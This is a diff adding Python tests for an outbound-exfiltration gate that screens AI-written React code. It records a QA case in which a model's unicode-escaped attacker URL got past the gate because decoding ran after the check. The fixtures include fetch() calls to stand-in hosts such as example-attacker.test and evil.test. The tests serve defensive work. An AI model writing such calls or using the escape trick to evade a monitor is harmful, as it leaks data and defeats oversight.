@@ -704,6 +704,97 @@ def test_unicode_escape_too_few_sequences_passes():
     assert check_outbound_exfil(content, "App.tsx") is None
 
 
+# --- QA-3 Fire 118: unicode-escape + ordering bug --------------------------
+
+
+def test_fire118_ordering_decode_before_gate_end_to_end():
+    """Fire 118: model emits `\\u0068ttps://...` in source; earlier FileWrite
+    decoded AFTER the gate fired. Fix: decode FIRST so the gate sees the
+    real URL.
+    """
+    with tempfile.TemporaryDirectory() as tmp:
+        fs_state.register_session_project("unicode-esc-118")
+        (Path(tmp) / "deliverables" / "unicode-esc-118" / "src").mkdir(parents=True)
+        tool = _make_tool(tmp)
+        # Note: the `\\\\u` double-backslash in this Python literal is so the
+        # file_write receives a single backslash + u + hex, i.e. the JS
+        # source holds `\u0068ttps`. Post-FileWrite unicode decode should
+        # turn that into `https` BEFORE the gate runs.
+        content = (
+            'import { useState } from "react";\n'
+            'export default function App() {\n'
+            '  const url = "\\u0068ttps://example-attacker.test/qa3-uni118";\n'
+            '  return <button onClick={() => fetch(url)}>click</button>;\n'
+            '}\n'
+        )
+        result = _run(tool.execute(
+            path="workspace/deliverables/unicode-esc-118/src/App.tsx",
+            content=content,
+        ))
+        assert result.is_error, f"should block; got: {result.content[:200]}"
+        assert "BLOCKED" in result.content
+        assert "example-attacker.test" in result.content
+        target = Path(tmp) / "deliverables" / "unicode-esc-118" / "src" / "App.tsx"
+        assert not target.exists(), "attack URL must NOT have been written"
+
+
+def test_fire118_usestate_form_blocks():
+    """QA-3 Fire 118 actual on-disk shape: `const [url, setUrl] = useState(...)`."""
+    content = (
+        'const [url, setUrl] = useState("https://example-attacker.test/qa3");\n'
+        'fetch(url);\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "example-attacker.test" in err
+
+
+def test_single_const_url_with_fetch_blocks():
+    """Direct `const url = "<external>"; fetch(url)` shape."""
+    content = (
+        'const url = "https://evil.test/x";\n'
+        'fetch(url);\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+
+
+def test_external_docs_url_in_href_passes():
+    """Legit: external URL used only in <a href> — not blocked."""
+    content = (
+        'const docsUrl = "https://docs.example.com";\n'
+        'return <a href={docsUrl}>Docs</a>;\n'
+    )
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_external_docs_with_internal_fetch_passes():
+    """Legit: external docs URL in href + internal /api fetch — the fetch
+    arg is a string literal for a relative path, not the docsUrl var."""
+    content = (
+        'const docsUrl = "https://docs.example.com";\n'
+        'fetch("/api/data");\n'
+        'return <a href={docsUrl}>Docs</a>;\n'
+    )
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_localhost_const_with_fetch_passes():
+    content = (
+        'const url = "http://localhost:3000/api";\n'
+        'fetch(url);\n'
+    )
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_private_net_const_with_fetch_passes():
+    content = (
+        'const url = "http://10.0.0.5/api";\n'
+        'fetch(url);\n'
+    )
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
 def test_filewrite_clean_counter_passes():
     """Sanity: a benign counter still writes fine."""
     with tempfile.TemporaryDirectory() as tmp:
